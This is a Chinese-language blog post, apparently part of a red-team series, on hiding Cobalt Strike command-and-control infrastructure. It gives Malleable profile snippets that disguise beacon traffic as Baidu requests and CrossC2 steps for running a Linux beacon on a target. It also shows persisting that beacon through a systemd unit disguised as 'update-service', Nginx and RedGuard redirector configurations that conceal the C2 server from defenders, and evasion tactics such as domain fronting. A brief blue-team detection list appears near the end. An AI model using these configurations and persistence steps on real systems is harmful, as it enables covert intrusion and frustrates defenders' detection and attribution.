+<h3 id="修改后的流量对比"><a href="#修改后的流量对比" class="headerlink" title="修改后的流量对比"></a>修改后的流量对比</h3><p>使用自定义 Profile 后，流量完全伪装成百度访问：</p>
+<p><img src="/2026/02/13/cs1/17.webp" loading='lazy'></p>
+<p><img src="/2026/02/13/cs1/18.webp" loading='lazy'></p>
+<p><strong>流量混淆效果</strong>：</p>
+<ul>
+<li>URI 路径伪装成搜索请求</li>
+<li>User-Agent 使用最新浏览器版本</li>
+<li>Cookie 格式符合百度规范</li>
+<li>响应头模拟真实服务器</li>
+</ul>
+<hr>
+<h3 id="Profile-高级技巧"><a href="#Profile-高级技巧" class="headerlink" title="Profile 高级技巧"></a>Profile 高级技巧</h3><p><strong>1. 流量分段传输</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    client &#123;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend <span class="string">&quot;session=&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;;path=/&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 数据加密</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    client &#123;</span><br><span class="line">        output &#123;</span><br><span class="line">            mask;                         # XOR 加密</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 多 URI 轮询</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/v1/data /api/v2/sync /cdn/resource.js&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 自定义响应体</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Cobalt-Strike-跨平台上线"><a href="#Cobalt-Strike-跨平台上线" class="headerlink" title="Cobalt Strike 跨平台上线"></a>Cobalt Strike 跨平台上线</h1><h2 id="Linux-主机上线（CrossC2）"><a href="#Linux-主机上线（CrossC2）" class="headerlink" title="Linux 主机上线（CrossC2）"></a>Linux 主机上线（CrossC2）</h2><p>CS 默认只支持 Windows，通过 CrossC2 插件可以实现 Linux&#x2F;macOS 上线。</p>
+<h3 id="下载与配置"><a href="#下载与配置" class="headerlink" title="下载与配置"></a>下载与配置</h3><p><strong>项目地址</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gloxec/CrossC2</span><br></pre></td></tr></table></figure>
+
+<p><strong>文件说明</strong>：</p>
+<ul>
+<li><code>CrossC2.cna</code>：CS 插件脚本</li>
+<li><code>genCrossC2.Linux</code>：Linux Payload 生成器</li>
+<li><code>genCrossC2.MacOS</code>：macOS Payload 生成器</li>
+</ul>
+<p><strong>修改插件路径</strong>：</p>
+<p>编辑 <code>CrossC2.cna</code>，修改生成器路径：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$genCC2 = <span class="string">&quot;/root/CrossC2/genCrossC2.Linux&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/19.webp" loading='lazy'></p>
+<hr>
+<h3 id="加载插件"><a href="#加载插件" class="headerlink" title="加载插件"></a>加载插件</h3><p>在 CS 客户端中：<code>Cobalt Strike -&gt; Script Manager -&gt; Load -&gt; 选择 CrossC2.cna</code></p>
+<p><img src="/2026/02/13/cs1/20.webp" loading='lazy'></p>
+<hr>
+<h3 id="生成-Linux-Payload"><a href="#生成-Linux-Payload" class="headerlink" title="生成 Linux Payload"></a>生成 Linux Payload</h3><p>右键 Listener -&gt; <code>CrossC2 Payload Generator</code></p>
+<p><img src="/2026/02/13/cs1/21.webp" loading='lazy'></p>
+<p><strong>参数配置</strong>：</p>
+<ul>
+<li><strong>Beacon Port</strong>：CrossC2 监听端口（建议与 CS 端口不同）</li>
+<li><strong>Keys File</strong>：CS 服务器的 <code>.cobaltstrike.beacon_keys</code> 文件（从服务器拷贝）</li>
+<li><strong>Rebind Dynamic Lib</strong>：如果使用了 Profile，需要编译对应的 <code>.so</code> 文件</li>
+<li><strong>Listener</strong>：选择 HTTPS Listener（推荐）</li>
+<li><strong>Arch</strong>：目标架构（x86&#x2F;x64）</li>
+</ul>
+<p><strong>生成文件</strong>：</p>
+<p><img src="/2026/02/13/cs1/22.webp" loading='lazy'></p>
+<hr>
+<h3 id="目标机器执行"><a href="#目标机器执行" class="headerlink" title="目标机器执行"></a>目标机器执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x beacon_linux_x64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台执行</span></span><br><span class="line"><span class="built_in">nohup</span> ./beacon_linux_x64 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 systemd 持久化</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/systemd/system/update-service.service &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=System Update Service</span></span><br><span class="line"><span class="string">After=network.target</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">Type=simple</span></span><br><span class="line"><span class="string">ExecStart=/opt/beacon_linux_x64</span></span><br><span class="line"><span class="string">Restart=always</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> update-service</span><br><span class="line">systemctl start update-service</span><br></pre></td></tr></table></figure>
+
+<p><strong>上线成功</strong>：</p>
+<p><img src="/2026/02/13/cs1/23.webp" loading='lazy'></p>
+<hr>
+<h3 id="CrossC2-功能限制"><a href="#CrossC2-功能限制" class="headerlink" title="CrossC2 功能限制"></a>CrossC2 功能限制</h3><p><strong>支持的功能</strong>：</p>
+<ul>
+<li>文件上传&#x2F;下载</li>
+<li>Shell 命令执行</li>
+<li>端口扫描</li>
+<li>SOCKS 代理</li>
+<li>进程列表</li>
+</ul>
+<p><strong>不支持的功能</strong>：</p>
+<ul>
+<li>Mimikatz（仅 Windows）</li>
+<li>屏幕截图</li>
+<li>键盘记录</li>
+<li>令牌窃取</li>
+</ul>
+<hr>
+<h1 id="中间件流量转发"><a href="#中间件流量转发" class="headerlink" title="中间件流量转发"></a>中间件流量转发</h1><h2 id="流量转发架构"><a href="#流量转发架构" class="headerlink" title="流量转发架构"></a>流量转发架构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Victim -&gt; Nginx (Redirector) -&gt; Cobalt Strike -&gt; Operator</span><br><span class="line">   ↓</span><br><span class="line">Normal Traffic -&gt; Nginx -&gt; Legitimate Website</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心思路</strong>：</p>
+<ul>
+<li>合法流量重定向到正常网站（如百度）</li>
+<li>CS Beacon 流量转发到 C2 服务器</li>
+<li>隐藏真实 C2 IP，对抗溯源</li>
+</ul>
+<hr>
+<h2 id="Nginx-转发配置"><a href="#Nginx-转发配置" class="headerlink" title="Nginx 转发配置"></a>Nginx 转发配置</h2><h3 id="安装-Nginx"><a href="#安装-Nginx" class="headerlink" title="安装 Nginx"></a>安装 Nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install nginx -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动并设置开机自启</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start nginx</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> nginx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/1.webp" loading='lazy'></p>
+<hr>
+<h3 id="自动生成配置文件"><a href="#自动生成配置文件" class="headerlink" title="自动生成配置文件"></a>自动生成配置文件</h3><p>使用 <code>cs2modrewrite</code> 工具自动生成 Nginx 配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载工具</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/threatexpress/cs2modrewrite.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成配置</span></span><br><span class="line">python3 cs2modrewrite/cs2nginx.py \</span><br><span class="line">  -i your_profile.profile \</span><br><span class="line">  -c http://192.168.31.143:8080 \</span><br><span class="line">  -r https://www.baidu.com/ \</span><br><span class="line">  -H mydomain.local &gt; nginx.conf</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-i</code>：CS Profile 文件路径</li>
+<li><code>-c</code>：C2 服务器地址和端口</li>
+<li><code>-r</code>：重定向目标（合法网站）</li>
+<li><code>-H</code>：Host 头过滤（可选）</li>
+</ul>
+<p><img src="/2026/02/13/cs1/2.webp" loading='lazy'></p>
+<hr>
+<h3 id="替换配置文件"><a href="#替换配置文件" class="headerlink" title="替换配置文件"></a>替换配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份原配置</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换配置</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> nginx.conf /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试配置</span></span><br><span class="line"><span class="built_in">sudo</span> nginx -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重载配置</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl reload nginx</span><br></pre></td></tr></table></figure>
+
+<p><strong>验证效果</strong>：</p>
+<p>访问 Nginx 服务器的 80 端口，应显示重定向目标网站（如百度）：</p>
+<p><img src="/2026/02/13/cs1/3.webp" loading='lazy'></p>
+<hr>
+<h3 id="手动配置示例"><a href="#手动配置示例" class="headerlink" title="手动配置示例"></a>手动配置示例</h3><p>如果不使用自动生成工具，可以手动编写 Nginx 配置：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> mydomain.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 匹配 CS Beacon 流量（根据 Profile 的 URI）</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ ^/(s|v2/api)</span> &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://192.168.31.143:8080;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他流量重定向到百度</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">302</span> https://www.baidu.com<span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Cobalt-Strike-监听器配置"><a href="#Cobalt-Strike-监听器配置" class="headerlink" title="Cobalt Strike 监听器配置"></a>Cobalt Strike 监听器配置</h2><p>在 CS 中创建 HTTP&#x2F;HTTPS Listener：</p>
+<p><img src="/2026/02/13/cs1/4.webp" loading='lazy'></p>
+<p><strong>关键配置</strong>：</p>
+<ul>
+<li><strong>Host</strong>：Nginx 服务器的公网 IP 或域名</li>
+<li><strong>Port</strong>：80 或 443（Nginx 监听端口）</li>
+<li><strong>Bind Port</strong>：CS 实际监听端口（如 8080）</li>
+</ul>
+<p><strong>生成 Payload</strong>：</p>
+<p><img src="/2026/02/13/cs1/6.webp" loading='lazy'></p>
+<hr>
+<h2 id="流量转发验证"><a href="#流量转发验证" class="headerlink" title="流量转发验证"></a>流量转发验证</h2><p><strong>测试流程</strong>：</p>
+<ol>
+<li>在目标机器执行 Payload</li>
+<li>观察 Nginx 访问日志：<code>tail -f /var/log/nginx/access.log</code></li>
+<li>确认流量被转发到 CS 服务器</li>
+<li>CS 客户端显示 Beacon 上线</li>
+</ol>
+<hr>
+<h1 id="RedGuard-智能重定向"><a href="#RedGuard-智能重定向" class="headerlink" title="RedGuard 智能重定向"></a>RedGuard 智能重定向</h1><p>RedGuard 是一款 C2 前置流量控制工具，相比 Nginx 提供更强大的流量过滤和重定向功能。</p>
+<h2 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h2><p><strong>项目地址</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wikiZ/RedGuard</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装步骤</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载二进制文件</span></span><br><span class="line">wget https://github.com/wikiZ/RedGuard/releases/download/v1.0/RedGuard_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x RedGuard_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化运行（生成配置文件）</span></span><br><span class="line">./RedGuard_64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/5.webp" loading='lazy'></p>
+<hr>
+<h2 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h2><p>编辑 <code>config.json</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;CertFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./cert.pem&quot;</span><span class="punctuation">,</span>              <span class="comment">// SSL 证书路径</span></span><br><span class="line">  <span class="attr">&quot;KeyFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./key.pem&quot;</span><span class="punctuation">,</span>                <span class="comment">// SSL 私钥路径</span></span><br><span class="line">  <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;443&quot;</span><span class="punctuation">,</span>                         <span class="comment">// 监听端口</span></span><br><span class="line">  <span class="attr">&quot;HasCert&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span>                     <span class="comment">// 是否启用 HTTPS</span></span><br><span class="line">  <span class="attr">&quot;HostTarget&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://192.168.31.143:8443&quot;</span><span class="punctuation">,</span>  <span class="comment">// C2 服务器地址</span></span><br><span class="line">  <span class="attr">&quot;RedirectURL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.google.com&quot;</span><span class="punctuation">,</span>      <span class="comment">// 重定向目标</span></span><br><span class="line">  <span class="attr">&quot;AllowIP&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;192.168.1.0/24&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>         <span class="comment">// 白名单 IP（可选）</span></span><br><span class="line">  <span class="attr">&quot;AllowLocation&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;CN&quot;</span><span class="punctuation">,</span> <span class="string">&quot;US&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>         <span class="comment">// 白名单地理位置（可选）</span></span><br><span class="line">  <span class="attr">&quot;AllowTime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;08:00-18:00&quot;</span><span class="punctuation">,</span>            <span class="comment">// 允许访问时间（可选）</span></span><br><span class="line">  <span class="attr">&quot;MalleableFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./your_profile.profile&quot;</span><span class="punctuation">,</span>    <span class="comment">// CS Profile 文件</span></span><br><span class="line">  <span class="attr">&quot;ProxyPass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://192.168.31.143:8443&quot;</span>    <span class="comment">// 反向代理地址</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/7.webp" loading='lazy'></p>
+<p><strong>高级过滤规则</strong>：</p>
+<ul>
+<li><strong>IP 白名单</strong>：只允许特定 IP 段访问 C2</li>
+<li><strong>地理位置过滤</strong>：根据 GeoIP 过滤请求</li>
+<li><strong>时间窗口</strong>：只在特定时间段允许 Beacon 通信</li>
+<li><strong>User-Agent 过滤</strong>：阻止爬虫和扫描器</li>
+<li><strong>JA3 指纹过滤</strong>：检测 SSL&#x2F;TLS 客户端指纹</li>
+</ul>
+<hr>
+<h2 id="启动-RedGuard"><a href="#启动-RedGuard" class="headerlink" title="启动 RedGuard"></a>启动 RedGuard</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前台运行</span></span><br><span class="line">./RedGuard_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台运行</span></span><br><span class="line"><span class="built_in">nohup</span> ./RedGuard_64 &gt; redguard.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 systemd 管理</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/systemd/system/redguard.service &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=RedGuard C2 Redirector</span></span><br><span class="line"><span class="string">After=network.target</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">Type=simple</span></span><br><span class="line"><span class="string">WorkingDirectory=/opt/redguard</span></span><br><span class="line"><span class="string">ExecStart=/opt/redguard/RedGuard_64</span></span><br><span class="line"><span class="string">Restart=always</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> redguard</span><br><span class="line">systemctl start redguard</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Cobalt-Strike-监听器配置-1"><a href="#Cobalt-Strike-监听器配置-1" class="headerlink" title="Cobalt Strike 监听器配置"></a>Cobalt Strike 监听器配置</h2><p>创建 HTTPS Listener，指向 RedGuard 服务器：</p>
+<p><img src="/2026/02/13/cs1/8.webp" loading='lazy'></p>
+<p><strong>配置要点</strong>：</p>
+<ul>
+<li><strong>Host</strong>：RedGuard 服务器的公网 IP 或域名</li>
+<li><strong>Port</strong>：443（RedGuard 监听端口）</li>
+<li><strong>Profile</strong>：使用与 RedGuard 配置相同的 Profile</li>
+</ul>
+<hr>
+<h2 id="RedGuard-日志分析"><a href="#RedGuard-日志分析" class="headerlink" title="RedGuard 日志分析"></a>RedGuard 日志分析</h2><p>RedGuard 会记录所有请求，包括被拦截的流量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f redguard.log</span><br></pre></td></tr></table></figure>
+
+<p><strong>日志示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[2024-02-13 10:30:15] [ALLOW] 192.168.1.100 -&gt; /s?wd=test (Beacon)</span><br><span class="line">[2024-02-13 10:30:20] [BLOCK] 8.8.8.8 -&gt; / (Scanner)</span><br><span class="line">[2024-02-13 10:30:25] [REDIRECT] 1.1.1.1 -&gt; / (Normal Traffic)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="流量转发对比"><a href="#流量转发对比" class="headerlink" title="流量转发对比"></a>流量转发对比</h1><table>
+<thead>
+<tr>
+<th>方案</th>
+<th>优势</th>
+<th>劣势</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Nginx</strong></td>
+<td>配置简单、性能高、稳定性好</td>
+<td>过滤规则有限</td>
+<td>基础流量转发</td>
+</tr>
+<tr>
+<td><strong>Apache mod_rewrite</strong></td>
+<td>规则灵活、支持复杂正则</td>
+<td>性能较低</td>
+<td>需要复杂规则匹配</td>
+</tr>
+<tr>
+<td><strong>RedGuard</strong></td>
+<td>智能过滤、支持多维度检测</td>
+<td>配置复杂、资源占用高</td>
+<td>高对抗环境</td>
+</tr>
+<tr>
+<td><strong>CDN</strong></td>
+<td>隐藏真实 IP、全球加速</td>
+<td>成本高、可能被封禁</td>
+<td>长期行动</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="防御检测与对抗"><a href="#防御检测与对抗" class="headerlink" title="防御检测与对抗"></a>防御检测与对抗</h1><h2 id="蓝队检测手段"><a href="#蓝队检测手段" class="headerlink" title="蓝队检测手段"></a>蓝队检测手段</h2><ol>
+<li><strong>SSL&#x2F;TLS 指纹识别</strong>：JARM、JA3、JA3S</li>
+<li><strong>证书异常检测</strong>：自签名证书、证书链不完整</li>
+<li><strong>流量行为分析</strong>：固定心跳间隔、异常 URI 模式</li>
+<li><strong>威胁情报匹配</strong>：已知 C2 IP、域名、证书哈希</li>
+<li><strong>Beacon 元数据分析</strong>：固定的 Base64 编码格式</li>
+</ol>
+<h2 id="红队对抗策略"><a href="#红队对抗策略" class="headerlink" title="红队对抗策略"></a>红队对抗策略</h2><ol>
+<li><strong>使用合法 CA 证书</strong>：Let’s Encrypt、Cloudflare</li>
+<li><strong>域前置（Domain Fronting）</strong>：利用 CDN 隐藏真实域名</li>
+<li><strong>动态 C2</strong>：定期更换 C2 服务器 IP 和域名</li>
+<li><strong>流量加密</strong>：使用自定义加密算法</li>
+<li><strong>心跳抖动</strong>：随机化 Beacon 通信间隔</li>
+<li><strong>多层代理</strong>：Victim -&gt; Proxy1 -&gt; Proxy2 -&gt; C2</li>
+</ol>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Cobalt Strike 的隐蔽部署是红队行动成功的关键。通过以下措施可以有效对抗蓝队检测：</p>
+<ol>
+<li><strong>特征抹除</strong>：修改端口、证书、流量特征</li>
+<li><strong>流量混淆</strong>：使用自定义 C2 Profile 伪装合法流量</li>
+<li><strong>架构隔离</strong>：使用中间件转发隐藏真实 C2 IP</li>
+<li><strong>智能过滤</strong>：使用 RedGuard 等工具过滤异常流量</li>
+<li><strong>持续更新</strong>：定期更换基础设施，对抗威胁情报</li>
+</ol>
+<p>记住：C2 隐藏是一个持续对抗的过程，需要根据目标环境的安全产品特点，灵活调整部署策略。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Cobalt-Strike/">Cobalt Strike</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">流量转发</a><a class="post-meta__tags" href="/tags/Nginx/">Nginx</a><a class="post-meta__tags" href="/tags/RedGuard/">RedGuard</a><a class="post-meta__tags" href="/tags/%E9%87%8D%E5%AE%9A%E5%90%91/">重定向</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/cs3/" title="DLL 劫持技术实战（白加黑）"><img class="cover" src="/img/covers/shinchan-cover-03.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">DLL 劫持技术实战（白加黑）</div></div><div class="info-2"><div class="info-item-1">DLL 劫持原理什么是 DLL 劫持DLL 劫持（DLL Hijacking）是一种利用 Windows DLL 搜索顺序机制的攻击技术。当应用程序调用 LoadLibrary() 或 LoadLibraryEx() 加载 DLL 时，如果未指定完整路径，Windows 会按照预定义的搜索顺序查找 DLL 文件。攻击者可以在优先级更高的目录中放置恶意 DLL，使系统加载恶意代码而非合法 DLL。 白加黑技术白加黑（Living off the Land） 是指利用合法的、已签名的可执行文件（白文件）加载恶意 DLL（黑文件），从而绕过安全软件的检测。这种技术的优势在于：  信任链利用：合法程序通常具有数字签名，被安全软件信任 行为隐蔽：恶意行为由合法进程执行，难以被行为检测识别 免杀效果好：不需要修改白文件，只需替换 DLL 持久化简单：可以通过快捷方式、计划任务等方式持久化   Windows DLL 搜索顺序标准搜索顺序当应用程序调用 LoadLibrary(&quot;example.dll&quot;) 时，Windows 按以下顺序搜索 DLL：  应用程序所在目录（最...</div></div></div></a><a class="pagination-related" href="/2026/02/13/web1/" title="WAF 绕过技术实战指南"><img class="cover" src="/img/covers/shinchan-cover-07.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">WAF 绕过技术实战指南</div></div><div class="info-2"><div class="info-item-1">WAF 绕过核心思路Web 